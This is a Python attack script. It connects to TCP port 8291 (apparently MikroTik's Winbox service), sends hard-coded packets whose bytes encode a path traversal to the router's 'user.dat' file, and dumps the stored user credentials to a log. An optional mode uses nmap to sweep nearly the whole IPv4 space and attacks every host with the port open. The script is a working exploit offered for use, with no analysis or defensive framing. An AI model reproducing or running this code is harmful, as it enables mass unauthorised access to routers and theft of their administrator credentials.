#!/usr/bin/env python3

import socket
import sys
import time
import nmap
import threading
from extract_user import dump
from queue import Queue

filename = time.strftime('%c')
threads = 100
i = 0

def write_to_file(text):
    with open(filename, 'a') as out:
        out.write(text + '\n')

def scan(ip):
    a = [0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
        0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
        0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
        0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
        0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
        0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
        0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
        0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
        0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
        0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
        0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
        0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
        0x00, 0x00]

    b = [0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
        0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
        0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
        0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
        0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
        0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
        0x00, 0x02, 0x00, 0x00, 0x00]

    #Initialize Socket
    s = socket.socket()
    s.settimeout(3)
    s.connect((ip, 8291))

    #Convert to bytearray for manipulation
    a = bytearray(a)
    b = bytearray(b)

    #Send hello and recieve the sesison id
    s.send(a)
    d = bytearray(s.recv(1024))

    #Replace the session id in template
    b[19] = d[38]

    #Send the edited response
    s.send(b)
    d = bytearray(s.recv(1024))

    #Get results
    output = str(ip) + "\n"
    output += str(dump(d[55:]))  + "\n"
    output += "==========================\n"
    write_to_file(output)
    print(output)



def callback_result(host, scan_result):
    #print("Trying.. " + host)
    if scan_result['scan'] and scan_result['scan'][host]['tcp'][8291]['state'] == 'open':
        #print("Start scaning host: " + host)
        try:
            scan(host)
        except:
            pass
            #print("Filed to scan host: " + host)
    

def scanSubNet(mask):
    start_time = time.time()
    nma = nmap.PortScannerAsync()
    nma.scan(hosts=mask, arguments='-p 8291', callback=callback_result)
    while nma.still_scanning():
        nma.wait(2)   # you can do whatever you want but I choose to wait after the end of the scan
    use_hours = (time.time() - start_time) / 60 / 60
    print("Time left.. " + str(i * use_hours))

class globalScaner(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue
    
    def run(self):
        while True:
            mask = self.queue.get()
            scanSubNet(mask)
            self.queue.task_done()

def globalScan():
    queue = Queue()
    print("Starting threads...")
    for i in range(threads):
        t = globalScaner(queue)
        t.setDaemon(True)
        t.start()

    print("Generating masks....")
    for a in range(1, 255, 1):
        for b in range(1, 255, 1):
            for c in range(1, 255, 1):
                mask = str(a) + "." + str(b) + "." + str(c) + ".0/24"
                queue.put(mask)
                i += 1
    print("Find " + str(i) + "mask")
    queue.join()


if __name__ == "__main__":
    print("[IP_ADDRESS/24]")
    try:
        if len(sys.argv) > 0:
            mask = sys.argv[1]
            scanSubNet(mask)
        else:
            print("Starting global scan")
            globalScan()
    except:
        print("Some error :(")

     